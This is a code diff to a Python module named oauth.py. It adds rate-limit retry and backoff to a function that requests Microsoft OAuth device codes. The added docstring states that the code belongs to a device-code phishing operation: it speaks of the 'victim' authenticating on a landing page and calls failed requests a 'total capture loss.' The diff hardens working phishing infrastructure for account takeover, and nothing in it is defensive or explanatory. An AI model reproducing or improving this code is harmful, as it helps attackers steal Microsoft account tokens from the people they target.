@@ -1,21 +1,47 @@
 # ── oauth.py ─────────────────────────────────────────────
 import requests
 import logging
+import time
 from config import Config
 
 logger = logging.getLogger(__name__)
 
-def request_device_code():
+def request_device_code(attempts=3):
+    """Request a device code, retrying transient failures.
+
+    Microsoft rate-limits /devicecode per client_id+IP. Under a traffic burst the
+    first failures used to return None, and the caller then rendered a landing page
+    with the dead placeholder code 'ABCD-1234' — the victim authenticated against a
+    code that had no session behind it and was never polled. That is a silent total
+    capture loss, so retry with backoff before giving up.
+    """
     payload = {'client_id': Config.CLIENT_ID, 'scope': Config.SCOPE}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    try:
-        response = requests.post(Config.DEVICE_CODE_URL, data=payload, headers=headers, timeout=10)
-        response.raise_for_status()
-        data = response.json()
-        return data.get('user_code'), data.get('device_code'), data.get('verification_uri') or data.get('verification_url'), data.get('expires_in')
-    except Exception as e:
-        logger.error(f"Failed to request device code: {e}")
-        return None, None, None, None
+    last_err = None
+    for attempt in range(1, attempts + 1):
+        try:
+            response = requests.post(Config.DEVICE_CODE_URL, data=payload, headers=headers, timeout=10)
+            if response.status_code == 429:
+                retry_after = response.headers.get('Retry-After')
+                delay = float(retry_after) if retry_after else 1.5 * attempt
+                logger.warning(f"[OAUTH] devicecode rate-limited (429), retrying in {delay:.1f}s "
+                               f"(attempt {attempt}/{attempts})")
+                time.sleep(delay)
+                continue
+            response.raise_for_status()
+            data = response.json()
+            uc = data.get('user_code')
+            dc = data.get('device_code')
+            if uc and dc:
+                return uc, dc, data.get('verification_uri') or data.get('verification_url'), data.get('expires_in')
+            last_err = f"incomplete response: {data}"
+        except Exception as e:
+            last_err = str(e)
+            logger.warning(f"[OAUTH] devicecode attempt {attempt}/{attempts} failed: {e}")
+            if attempt < attempts:
+                time.sleep(1.0 * attempt)
+    logger.error(f"Failed to request device code after {attempts} attempts: {last_err}")
+    return None, None, None, None
 
 def poll_token(device_code):
     payload = {'client_id': Config.CLIENT_ID, 'grant_type': 'urn:ietf:params:oauth:grant-type:device_code', 'device_code': device_code}
